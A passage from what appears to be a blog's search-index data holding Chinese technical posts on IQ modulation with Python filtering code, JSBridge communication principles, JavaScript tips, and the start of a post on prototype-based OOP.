matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"></span><br><span class=\"line\">t_max = <span class=\"number\">1.5</span></span><br><span class=\"line\">fs = <span class=\"number\">360</span></span><br><span class=\"line\">fc = <span class=\"number\">10</span></span><br><span class=\"line\"></span><br><span class=\"line\">times = np.arange(<span class=\"number\">0</span>, t_max, <span class=\"number\">1</span>/fs)</span><br><span class=\"line\">phases = <span class=\"number\">2</span> * np.pi * fc * times</span><br><span class=\"line\">new_tickets = np.arange(<span class=\"number\">0</span>, t_max, <span class=\"number\">1</span>/<span class=\"number\">8</span>)</span><br><span class=\"line\">new_lables = new_tickets * fs</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">signal_I</span>(<span class=\"params\">I</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> I * np.cos(phases)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">signal_Q</span>(<span class=\"params\">Q</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Q * np.sin(phases)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">signal_IQ</span>(<span class=\"params\">I,Q</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> signal_I(I) + signal_Q(Q)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test_receive</span>():</span><br><span class=\"line\">    cut_off = <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"comment\"># 使用窗口法的 FIR 滤波器，[滤波器的长度，截止频率]</span></span><br><span class=\"line\">    b = sig.firwin(<span class=\"number\">51</span>, cut_off/fs/<span class=\"number\">2</span>)     </span><br><span class=\"line\">    <span class=\"comment\"># 生成 IQ 调制信号       </span></span><br><span class=\"line\">    signal = signal_IQ(<span class=\"number\">1</span>,<span class=\"number\">2</span>)                    </span><br><span class=\"line\"></span><br><span class=\"line\">    plt.plot(times, signal, label=<span class=\"string\">&#x27;signal_IQ(1,2)&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 使用 IIR 或 FIR 滤波器沿一维筛选数据，[分子向量，分母向量，输入序列]</span></span><br><span class=\"line\">    plt.plot(times, sig.lfilter(b, <span class=\"number\">1</span>, <span class=\"number\">2</span> * signal * np.cos(phases)), label=<span class=\"string\">&#x27;I&#x27;</span>)</span><br><span class=\"line\">    plt.plot(times, sig.lfilter(b, <span class=\"number\">1</span>, <span class=\"number\">2</span> * signal * np.sin(phases)), label=<span class=\"string\">&#x27;Q&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    plt.grid()</span><br><span class=\"line\">    plt.xticks(ticks=new_tickets, labels=new_lables)</span><br><span class=\"line\">    plt.legend()</span><br><span class=\"line\">    plt.show()</span><br><span class=\"line\"></span><br><span class=\"line\">test_receive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/09/22/IQ-%E8%B0%83%E5%88%B6%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/receive.png\" alt=\"receive\"></p>\n<hr>\n<h2 id=\"附录一：时域和频域\"><a href=\"#附录一：时域和频域\" class=\"headerlink\" title=\"附录一：时域和频域\"></a>附录一：时域和频域</h2><p>时域（time domain）：是信号在时间轴随时间变化的总体概括。是真实世界存在的域，可以通过示波器来看。<br>频域（frequency domain）：描述频率变化和幅度变化的关系，是把时域波形的表达式做傅立叶等变化得到复频域的表达式。是一个存在于数学定义中的域，可以通过频谱仪来看。</p>\n<p><img src=\"/2024/09/22/IQ-%E8%B0%83%E5%88%B6%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/sp.gif\" alt=\"图示\"></p>\n<p><img src=\"/2024/09/22/IQ-%E8%B0%83%E5%88%B6%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/T+P.jpg\" alt=\"换个角度看\"><br>从时域到频域，转换方法就是傅里叶变换，有三种类型：</p>\n<ul>\n<li>FI（Fourier Integral，傅里叶积分）：用于将时域内的理想数学表达式变换为频域表示，是将时域时间轴从负无穷到正无穷积分，得出从零到正无穷上连续的频域函数。</li>\n<li>DFT（Discrete Fourier Transform，离散傅里叶变换）：是傅里叶变换在时域和频域上都呈离散的形式，将信号的时域采样变换为其 DTFT（Discrete-time Fourier Transform，离散时间傅里叶变换）的频域采样。<br>  离散傅里叶变换不需要积分计算，只需要通过求和就可以实现转换。</li>\n<li>FFT（Fast Fourier Transform，快速傅里叶变换）：只应用于时域中数据点个数是 2 的整数次幂的情况（如 256、512、1024 点），使用了快速矩阵代数学的方法，计算速度可以比普通离散傅里叶变换快很多。<br>  需要注意的是，快速傅里叶变换要求信号是周期重复的，所以需要对原始信号进行相干采样，或在采样后加窗处理。</li>\n</ul>\n<p>IFFT（Inverse Fast Fourier Transform，逆快速傅里叶变换）算法是 FFT 的逆过程，它将频域信号转换回时域信号。在数学上，IFFT是FFT的逆运算，用于恢复原始的时域信号。</p>\n<p><img src=\"/2024/09/22/IQ-%E8%B0%83%E5%88%B6%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/IFFT+FFT.png\" alt=\"傅立叶变换\"></p>\n<h2 id=\"附录二：数字滤波器\"><a href=\"#附录二：数字滤波器\" class=\"headerlink\" title=\"附录二：数字滤波器\"></a>附录二：数字滤波器</h2><p>数字滤波器是利用计算机程序、专用芯片等软、硬件改变数字信号频谱。如果要处理的是模拟信号可以通过 A&#x2F;D 在信号形式上进行变换，在利用数字滤波器处理后经过 D&#x2F;A 恢复为模拟信号。</p>\n<p>根据冲激响应的不同，数字滤波器分为有限冲激响应（FIR）滤波器和无限冲激响应（IIR）滤波器。</p>\n<ul>\n<li>FIR 滤波器：冲激响应在有限时间内衰减为零，其输出仅取决于当前和过去的输入信号值。</li>\n<li>IIR 滤波器：冲激响应理论上应会无限持续，其输出不仅取决于当前和过去的输入信号值，也取决于过去的信号输出值。</li>\n</ul>\n<h3 id=\"FIR-滤波器\"><a href=\"#FIR-滤波器\" class=\"headerlink\" title=\"FIR 滤波器\"></a>FIR 滤波器</h3><p>FIR（Finite impulse response，有限冲激响应），是冲激响应为有限长度的滤波器，脉冲输入信号的响应会在有限时间内变为零。FIR 滤波器的表达式，也称为离散卷积：<br>$$ y[n] &#x3D; b_0x[n] + b_1x[n-1] + b_2x[n-2] + … &#x3D; \\sum _{i&#x3D;0}^N b_i \\cdot x[n-i] $$<br>其中:</p>\n<ul>\n<li>$N$ 是滤波器阶数，$N^{th}$ 阶滤波器表示在右边有 $ N+1$ 项</li>\n<li>$b_i$ 是 $N^{th}$ 阶滤波器在第 $i$ 时间的脉冲响应。</li>\n<li>$x[n]$ 是输入信号</li>\n<li>$y[n]$ 是输出信号</li>\n</ul>\n<h3 id=\"IIR-滤波器\"><a href=\"#IIR-滤波器\" class=\"headerlink\" title=\"IIR 滤波器\"></a>IIR 滤波器</h3><p>IIR（Infinite Impulse Response，无限冲激响应），是数字滤波器的一种。由于无限冲激响应滤波器中存在反馈回路，因此对于脉冲输入信号的响应是无限延续的。IIR 滤波器的表达式：<br>$$ y[n] &#x3D; \\sum _{i&#x3D;0}^P b_ix[n-i] + \\sum _{i&#x3D;1}^Q a_iy[n-i] $$<br>其中：</p>\n<ul>\n<li>$P$ 是前馈滤波器顺序</li>\n<li>$b_i$ 是前馈滤波器系数</li>\n<li>$Q$ 是反馈滤波器顺序</li>\n<li>$a_i$ 是反馈滤波器系数</li>\n<li>$x[n]$ 是输入信号</li>\n<li>$y[n]$ 是输出信号</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://en.wikipedia.org/wiki/In-phase_and_quadrature_components\">In-phase and quadrature components - Wiki</a></li>\n<li><a href=\"http://www.spectrumscience.cn/page93?article_id=145\">IQ 调制基本理论及解调简述</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_44586473/article/details/104066625\">详解IQ调制以及星座图原理</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_43870101/article/details/106543036\">Josh 的学习笔记之数字通信（Part 4——带通调制和解调）</a></li>\n<li><a href=\"https://blog.csdn.net/qq_36002089/article/details/127793378\">常用的信号处理函数 Scipy 之滤波器</a></li>\n<li><a href=\"https://www.zhihu.com/question/323353814\">如何通俗易懂地理解 FIR&#x2F;IIR 滤波器</a></li>\n<li><a href=\"https://www.jianshu.com/p/c825679ea991\">详解 FIR 滤波器与 IIR 滤波器的具体区别</a></li>\n<li><a href=\"https://www.cnblogs.com/LXP-Never/p/11558302.html\">快速傅里叶变换及python代码实现</a></li>\n</ul>\n<h3 id=\"视频教材\"><a href=\"#视频教材\" class=\"headerlink\" title=\"视频教材\"></a>视频教材</h3><ul>\n<li><a href=\"https://www.bilibili.com/video/BV1Au4y1d7TQ/?spm_id_from=333.999.0.0&vd_source=735a6376f6214c7b974a1074096ba0fa\">IQ 信号的理解</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1Ge411C7ee/?spm_id_from=333.788.recommend_more_video.-1&vd_source=735a6376f6214c7b974a1074096ba0fa\">QAM 通信原理2 - 大连理工大学</a></li>\n</ul>\n"},{"title":"JSBridge技术原理分析","url":"/2021/02/12/JSBridge%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/","content":"<h2 id=\"JSBridge的起源\"><a href=\"#JSBridge的起源\" class=\"headerlink\" title=\"JSBridge的起源\"></a>JSBridge的起源</h2><p><code>PhoneGap</code>（Codova 的前身）作为 Hybrid 鼻祖框架，是一个开源的移动开发框架，允许你用标准的web技术-HTML5,CSS3和JavaScript做跨平台的Hybird WebUI开发，应该是最先被开发者广泛认知的 JSBridge 的应用场景。而对于 JSBridge 的应用在国内真正兴盛起来，则是因为杀手级应用微信的出现。</p>\n<p>JSBridge 是一种JS 实现的Bridge，连接着桥两端的 Native 和 H5。 简单来讲，它在APP 内方便地让Native 调用JS，JS 调用Native ，是双向通信的通道。 JSBridge 主要提供了JS 调用Native 代码的能力，实现原生功能如查看本地相册、打开摄像头、指纹支付等。</p>\n<img src=\"/2021/02/12/JSBridge%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/jsbridge.png\" class=\"\">\n\n<p>既然是『简单来讲』，那么 JSBridge 的用途肯定不只『调用 Native 功能』这么简单宽泛。实际上，JSBridge 就像其名称中的『Bridge』的意义一样，是 Native 和非 Native 之间的桥梁，它的核心是 构建 Native 和非 Native 间消息通信的通道，而且是双向通信的通道。</p>\n<blockquote>\n<p>微信、头条等小程序基于 Web UI，但是为了追求运行效率，对 UI 展现逻辑和业务逻辑的 JavaScript 进行了隔离。</p>\n</blockquote>\n<h2 id=\"JSBridge的实现原理\"><a href=\"#JSBridge的实现原理\" class=\"headerlink\" title=\"JSBridge的实现原理\"></a>JSBridge的实现原理</h2><p>JavaScript 是运行在一个单独的 JS Context 中（例如，WebView 的 Webkit 引擎、JSCore）。由于这些 Context 与原生运行环境的天然隔离，我们可以将这种情况与 RPC（Remote Procedure Call，远程过程调用）通信进行类比，将 Native 与 JavaScript 的每次互相调用看做一次 RPC 调用。</p>\n<p>在 JSBridge 的设计中，可以把前端看做 RPC 的客户端，把 Native 端看做 RPC 的服务器端，从而 JSBridge 要实现的主要逻辑就出现了：通信调用（Native 与 JS 通信） 和 句柄解析调用。（如果你是个前端，而且并不熟悉 RPC 的话，你也可以把这个流程类比成 JSONP 的流程）</p>\n<p>通过以上的分析，可以清楚地知晓 JSBridge 主要的功能和职责，接下来就以 Hybrid 方案 为案例从这几点来剖析 JSBridge 的实现原理。</p>\n<h3 id=\"JS-调用-Native\"><a href=\"#JS-调用-Native\" class=\"headerlink\" title=\"JS 调用 Native\"></a>JS 调用 Native</h3><p>Hybrid 方案是基于 WebView 的，JavaScript 执行在 WebView 的 Webkit 引擎中。因此，Hybrid 方案中 JSBridge 的通信原理会具有一些 Web 特性。</p>\n<h4 id=\"方式1：注入API\"><a href=\"#方式1：注入API\" class=\"headerlink\" title=\"方式1：注入API\"></a>方式1：注入API</h4><p>对于 iOS来说，</p>\n<ul>\n<li>UIWebView提供了<code>JavaScriptScore</code>方法，支持 iOS 7.0 及以上系统</li>\n<li>WKWebview提供了 <code>window.webkit.messageHandlers</code> 方法，支持 iOS 8.0 及以上系统。</li>\n</ul>\n<p>对于Andriod来说，</p>\n<ul>\n<li>4.2 之前，Android 注入 JavaScript 对象的接口是 <code>addJavascriptInterface</code>，但是这个接口有漏洞，可以被不法分子利用，危害用户的安全，</li>\n<li>4.2 之后，Android引入新的接口 <code>@JavascriptInterface</code>以解决安全问题,所以 Android 注入对对象的方式是有兼容性问题的。</li>\n</ul>\n<h4 id=\"方式2：拦截-URL-SCHEME\"><a href=\"#方式2：拦截-URL-SCHEME\" class=\"headerlink\" title=\"方式2：拦截 URL SCHEME\"></a>方式2：拦截 URL SCHEME</h4><p><code>URL SCHEME</code>是一种类似于url的链接，是为了方便app直接互相调用设计的，形式和普通的 url 近似，主要区别是 protocol 和 host 一般是自定义的，例如: <code>qunarhy://hy/url?url=ymfe.tech</code>，protocol 是 qunarhy，host 则是 hy。</p>\n<p>拦截 URL SCHEME 的主要流程是：Web 端通过某种方式（例如 iframe.src）发送 URL Scheme 请求，之后 Native 拦截到请求并根据 URL SCHEME（包括所带的参数）进行相关操作。</p>\n<p>在实践过程中，这种方式有一定的缺陷：</p>\n<ol>\n<li>使用 iframe.src 发送 URL SCHEME 会有 url 长度的隐患。</li>\n<li>创建请求，需要一定的耗时，比注入 API 的方式调用同样的功能，耗时会较长。</li>\n</ol>\n<p>但是这种方式的最重要优势是跨平台兼容性，尤其是<strong>支持 iOS6</strong>，但考虑到终端覆盖率，已经不是主流方式。</p>\n<h4 id=\"方式3：重写-prompt-等原生-JS-方法\"><a href=\"#方式3：重写-prompt-等原生-JS-方法\" class=\"headerlink\" title=\"方式3：重写 prompt 等原生 JS 方法\"></a>方式3：重写 prompt 等原生 JS 方法</h4><p>WebView有一个方法，叫<code>setWebChromeClient</code>，可以设置<code>WebChromeClient</code>对象，而这个对象中有三个方法，分别是<code>onJsAlert</code>,<code>onJsConfirm</code>,<code>onJsPrompt</code>，当js调用window对象的对应的方法，即<code>window.alert</code>，<code>window.confirm</code>，<code>window.prompt</code>，WebChromeClient对象中的三个方法对应的就会被触发，我们是不是可以利用这个机制，自己做一些处理呢？答案是肯定的。</p>\n<p>由于拦截上述方法会对性能造成一定影响，因此需要选择使用频率较低的方法，而在Android中，相比其它几个方法，几乎不会使用到<code>prompt</code>方法，因此占用<code>prompt</code>是最佳方案。</p>\n<h3 id=\"Native-调用-JS\"><a href=\"#Native-调用-JS\" class=\"headerlink\" title=\"Native 调用 JS\"></a>Native 调用 JS</h3><p>Native 调用 JS 比较简单，只要 H5 将 JS 方法暴露在 Window 上给 Native 调用即可。</p>\n<p>Android 中主要有两种方式实现。</p>\n<ul>\n<li>在 4.4 以前，通过 <code>loadUrl</code> 方法，执行一段 JS 代码来实现。<br>  loadUrl 方法使用起来方便简洁，但是效率低无法获得返回结果且调用的时候会刷新 WebView 。</li>\n<li>在 4.4 以后，可以使用 <code>evaluateJavascript</code> 方法实现。<br>  该方法效率高获取返回值方便，调用时候不刷新 WebView，但是只支持 Android 4.4+。</li>\n</ul>\n<h2 id=\"JSBridge-如何引用\"><a href=\"#JSBridge-如何引用\" class=\"headerlink\" title=\"JSBridge 如何引用\"></a>JSBridge 如何引用</h2><p>对于 JSBridge 的引用，常用有两种方式，各有利弊。</p>\n<h3 id=\"方式1：由-Native-端进行注入\"><a href=\"#方式1：由-Native-端进行注入\" class=\"headerlink\" title=\"方式1：由 Native 端进行注入\"></a>方式1：由 Native 端进行注入</h3><p>注入方式和 Native 调用 JavaScript 类似，直接执行桥的全部代码。</p>\n<p>它的优点在于：桥的版本很容易与 Native 保持一致，Native 端不用对不同版本的 JSBridge 进行兼容；</p>\n<p>它的缺点是：注入时机不确定，需要实现注入失败后重试的机制，保证注入的成功率，同时 JavaScript 端在调用接口时，需要优先判断 JSBridge 是否已经注入成功。</p>\n<h3 id=\"方式2：由-JavaScript-端引用\"><a href=\"#方式2：由-JavaScript-端引用\" class=\"headerlink\" title=\"方式2：由 JavaScript 端引用\"></a>方式2：由 JavaScript 端引用</h3><p>与由 Native 端注入正好相反，它的优点在于：JavaScript 端可以确定 JSBridge 的存在，直接调用即可；</p>\n<p>缺点是：如果桥的实现方式有更改，JSBridge 需要兼容多版本的 Native Bridge 或者 Native Bridge 兼容多版本的 JSBridge。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://juejin.cn/post/6844903585268891662\">JSBridge原理的最佳教材</a></li>\n<li><a href=\"https://www.zoo.team/article/jsbridge\">小白必看，JSBridge 初探</a></li>\n<li><a href=\"https://developers.weixin.qq.com/community/develop/doc/d1421cd729a51548672430e544c458b2\">微信小程序weapp的底层实现原理</a></li>\n<li><a href=\"https://blog.csdn.net/sbsujjbcy/article/details/50752595\">Android JSBridge的原理与实现</a></li>\n<li><a href=\"https://www.zhihu.com/column/p/32146189\">Android安全开发之WebView中的地雷</a></li>\n</ul>\n"},{"title":"JavaScript 开发经验点滴","url":"/2022/05/05/JavaScript-%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C%E7%82%B9%E6%BB%B4/","content":"<h2 id=\"一、常用资料\"><a href=\"#一、常用资料\" class=\"headerlink\" title=\"一、常用资料\"></a>一、常用资料</h2><ul>\n<li><a href=\"https://www.runoob.com/js/js-class-intro.html\">JavaScript - 菜鸟课堂</a></li>\n<li><a href=\"https://es6.ruanyifeng.com/#docs/class\">ECMAScript 6 入门 - 阮一峰</a></li>\n<li><a href=\"https://www.liaoxuefeng.com/wiki/1022910821149312\">JavaScript教程 - 廖雪峰</a></li>\n<li><a href=\"https://www.w3school.com.cn/jsref/index.asp\">HTML DOM 参考手册 - W3School</a></li>\n</ul>\n<h2 id=\"二、有用技巧\"><a href=\"#二、有用技巧\" class=\"headerlink\" title=\"二、有用技巧\"></a>二、有用技巧</h2><h3 id=\"1-如何获得唯一标识符（UID）\"><a href=\"#1-如何获得唯一标识符（UID）\" class=\"headerlink\" title=\"1. 如何获得唯一标识符（UID）\"></a>1. 如何获得唯一标识符（UID）</h3><p>利用toString(36)，将一个数字转换为36进制，也就是10个数字+26个字母<br><code>uid = Number(Math.random().toString().split(&#39;.&#39;)[1]).toString(36);</code></p>\n<h3 id=\"2-localStorage采用-k-v-格式，仅支持字符串格式，怎么存储对象格式？\"><a href=\"#2-localStorage采用-k-v-格式，仅支持字符串格式，怎么存储对象格式？\" class=\"headerlink\" title=\"2. localStorage采用[k,v]格式，仅支持字符串格式，怎么存储对象格式？\"></a>2. localStorage采用[k,v]格式，仅支持字符串格式，怎么存储对象格式？</h3><ul>\n<li>存储：通过<code>JSON.stringify()</code>转换为序列号字符串；</li>\n<li>读取：通过<code>JSON.parse()</code>恢复为Object或任何其它数据类型</li>\n</ul>\n<h3 id=\"3-一元运算符加法-一元运算符减法\"><a href=\"#3-一元运算符加法-一元运算符减法\" class=\"headerlink\" title=\"3. 一元运算符加法 &amp; 一元运算符减法\"></a>3. 一元运算符加法 &amp; 一元运算符减法</h3><p>一元加法本质上对数字无任何影响，但对字符串却有有趣的效果，会把字符串转换成数字。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> iNum = <span class=\"number\">20</span>;</span><br><span class=\"line\">iNum = +iNum;</span><br><span class=\"line\"><span class=\"title function_\">alert</span>(iNum);            <span class=\"comment\">//输出 &quot;20&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> sNum = <span class=\"string\">&quot;20&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_\">alert</span>(<span class=\"keyword\">typeof</span> sNum);     <span class=\"comment\">//输出 &quot;string&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iNum = +sNum;</span><br><span class=\"line\"><span class=\"title function_\">alert</span>(<span class=\"keyword\">typeof</span> iNum);     <span class=\"comment\">//输出 &quot;number&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>类似的，一元减法就是对数值求负（例如，20 转换成 -20），或者将把字符串转换成近似的数字，并对该值求负（例如，字符串 “-20” 转换成 -20）。</p>\n<blockquote>\n<p>注意：一元运算符默认仅支持十进制，仅对以 “0x” 开头的字符串（表示十六进制数字），一元运算符才能把它转换成十进制的值（例如 “0xB” 将被转换成 11）</p>\n</blockquote>\n<p>请参考示例：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 不同于标准的isNaN(), Number.isNaN()不会默认进行的类型转换</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title class_\">Number</span>.<span class=\"built_in\">isNaN</span>(+<span class=\"variable language_\">this</span>.<span class=\"property\">config</span>.<span class=\"property\">timeout</span>) || <span class=\"title class_\">Number</span>.<span class=\"built_in\">isNaN</span>(+<span class=\"variable language_\">this</span>.<span class=\"property\">config</span>.<span class=\"property\">retry</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Error</span>(<span class=\"string\">`PxerThread#init: <span class=\"subst\">$&#123;<span class=\"variable language_\">this</span>.id&#125;</span> config illegal`</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-关于实例方法和原型方法（Todo）\"><a href=\"#4-关于实例方法和原型方法（Todo）\" class=\"headerlink\" title=\"4. 关于实例方法和原型方法（Todo）\"></a>4. 关于实例方法和原型方法（Todo）</h3><h3 id=\"5-关于apply、call和bind\"><a href=\"#5-关于apply、call和bind\" class=\"headerlink\" title=\"5. 关于apply、call和bind\"></a>5. 关于apply、call和bind</h3><h2 id=\"三、经验之谈\"><a href=\"#三、经验之谈\" class=\"headerlink\" title=\"三、经验之谈\"></a>三、经验之谈</h2><ul>\n<li>javascript<strong>不支持</strong>同名方法的重载，因为它是一种弱类型的编程语言</li>\n<li>关于Class，如果在一个方法前加上<code>static</code>关键字，就表示该方法不会被实例继承，而是直接通过类来调用，这就称为“静态方法”。<br>  ES6明确规定，Class内部只有静态方法，没有静态属性(指Class本身的属性，即Class.propName，而不是定义在实例对象（this）上的属性)</li>\n</ul>\n<hr>\n<h2 id=\"四、参考文献\"><a href=\"#四、参考文献\" class=\"headerlink\" title=\"四、参考文献\"></a>四、参考文献</h2><ul>\n<li><a href=\"https://blog.csdn.net/PY0312/article/details/103570989\">JS存储对象 localStorage 使用必知必会</a></li>\n<li><a href=\"https://www.w3school.com.cn/js/pro_js_operators_unary.asp\">ECMAScript 一元运算符</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000018884605\">ES6系列之class</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000018270750\">JS中的call、apply、bind方法详解</a></li>\n<li><a href=\"https://github.com/Lucifier129/Lucifier129.github.io/issues/7\">在 JavaScript 中用匿名函数（箭头函数）写出递归的方法</a></li>\n<li><a href=\"https://keenwon.com/1524.html\">ES5 和 ES6 中的继承</a></li>\n</ul>\n"},{"title":"JavaScript技术分析之一：面向对象编程","url":"/2022/06/04/JavaScript%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/","content":"<h2 id=\"一、面向对象编程（Object-oriented-programming）\"><a href=\"#一、面向对象编程（Object-oriented-programming）\" class=\"headerlink\" title=\"一、面向对象编程（Object-oriented programming）\"></a>一、面向对象编程（Object-oriented programming）</h2><p>对于面向对象的 OOP 编程语言，最基本的概念就是是：类、实例、对象。</p>\n<ul>\n<li>Class - 类是对象的类型模板<br>  类是抽象的，而不是其所描述的对象集合中的任何特定的个体。<br>  类定义了某一对象集合所具有的共同特征，包含了存储数据的结构（Attribute属性）和操纵数据的行为（Method方法）</li>\n<li>Instance - 实例是根据类创建的对象<br>  对象就是实例，是一个类的实例化。例如， Victoria 是 Employee 类的一个实例，表示一个特定的雇员个体。<br>  实例具有和其父类完全一致的属性，不多也不少。</li>\n</ul>\n<h3 id=\"基于类的OOP语言\"><a href=\"#基于类的OOP语言\" class=\"headerlink\" title=\"基于类的OOP语言\"></a>基于类的OOP语言</h3><p>大多数的OOP编程语言采用基于类（class-based）的模式，也称为经典模式，包括Java、Python、C++等，例如Java的开发过程完全基于Class，每个jar包就是一个完整的类定义，其核心理念是：</p>\n<ul>\n<li>强调类和实例是两种完全不同的实体，通过类来描述实例对象应该具有哪些状态和行为</li>\n<li>类是一个模板，对象是一个实例，必须首先定义类，然后才能根据模板完成相应对象的创建工作</li>\n<li>类与类之间形成了继承、组合等关系</li>\n</ul>\n<h3 id=\"基于原型的OOP语言\"><a href=\"#基于原型的OOP语言\" class=\"headerlink\" title=\"基于原型的OOP语言\"></a>基于原型的OOP语言</h3><p>然而，少数语言坚持采用基于原型（prototype-based）的模式，主要是JavaScript、Lua、Perl等，不区分类和实例的概念，而是通过原型（prototype）来实现面向对象编程。其强调程序员应关注一系列对象实例的行为，并将这些对象划分为使用方式相似的原型对象，而不是努力去将实体抽象为难以理解的Class。</p>\n<ul>\n<li>强调原型对象(prototypical object)，即不是根据“模板”，而是通过“复制”一个已经存在的对象（原型）来创建另一个新对象</li>\n<li>任何对象都可以作为另一个对象的原型，从而允许后者共享前者的属性，但只允许单继承</li>\n<li>强调动态属性和方法，任何对象都可以指定其自身的属性，既可以是创建时也可以在运行时修改</li>\n</ul>\n<h3 id=\"对比分析\"><a href=\"#对比分析\" class=\"headerlink\" title=\"对比分析\"></a>对比分析</h3><table>\n<thead>\n<tr>\n<th>基于类的（Java）</th>\n<th>基于原型的（JavaScript）</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>类和实例是不同的实体,通过类定义来定义类，通过构造器方法来实例化类</td>\n<td>所有对象都是实例，无需单独的类定义，通过构造器函数来定义和创建一组对象</td>\n</tr>\n<tr>\n<td>通过类定义来定义现存类的子类，从而构建对象的层级结构</td>\n<td>指定一个对象作为原型，并且与构造函数一起构建对象的层级结构</td>\n</tr>\n<tr>\n<td>支持多重继承，遵循<strong>类链</strong>继承属性</td>\n<td>仅支持单继承，遵循<strong>原型链</strong>继承属性</td>\n</tr>\n<tr>\n<td>类定义指定类的所有实例的所有属性，不允许运行时动态添加属性</td>\n<td>构造器函数或原型指定实例的初始属性集，允许动态地向单个对象或者整个对象集中添加或移除属性</td>\n</tr>\n<tr>\n<td>通过<code>new</code>操作符创建单个对象</td>\n<td>相同</td>\n</tr>\n</tbody></table>\n<h2 id=\"二、原型链的实现原理\"><a href=\"#二、原型链的实现原理\" class=\"headerlink\" title=\"二、原型链的实现原理\"></a>二、原型链的实现原理</h2><p>早期的JavaScript支持<code>Object</code>对象，但根本没有类的概念，也不支持<code>Class</code>关键字，实现类定义的唯一途径就是通过函数来<strong>模拟</strong>实现。<br>以ECMAScript 5为例，定义一个类就等同于定义一个构造函数，实现继承关系就是把一个对象(函数)的原型指向另一个对象(函数)，依次延展从而构成一条原型链。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 定义Person类的构造函数</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Person</span>(<span class=\"params\">name</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 实例属性</span></span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">name</span> = name</span><br><span class=\"line\">  <span class=\"comment\">// 实例方法</span></span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">sayName</span> = <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable language_\">this</span>.<span class=\"property\">name</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> person1 = <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&#x27;xyf1&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">var</span> person2 = <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&#x27;xyf2&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">//true</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(person1.<span class=\"property\">constructor</span> === <span class=\"title class_\">Person</span>)</span><br></pre></td></tr></table></figure>\n\n<p>实现原型链继承的关键是<code>__proto__</code>（隐式原型）和 <code>[[prototype]]</code>（显示原型）,JavaScript正是通过两者的合作实现了原型链，以及对象的继承。</p>\n<blockquote>\n<p>Every JavaScript object has a second JavaScript object (or null ,but this is rare) associated with it.<br>This second object is known as a prototype, and the first object inherits properties from the prototype.</p>\n</blockquote>\n<h3 id=\"隐式原型：-proto\"><a href=\"#隐式原型：-proto\" class=\"headerlink\" title=\"隐式原型：__proto__\"></a>隐式原型：<code>__proto__</code></h3><ul>\n<li>每个对象都有的一个属性，指向当前对象的原型对象</li>\n<li>当访问一个对象的属性时，如果对象内部不存在该属性，那么就通过<code>__proto__</code>去原型对象中寻找该属性，并一直循环下去，这就是<strong>原型链</strong>的概念</li>\n</ul>\n<h3 id=\"显式原型：-prototype\"><a href=\"#显式原型：-prototype\" class=\"headerlink\" 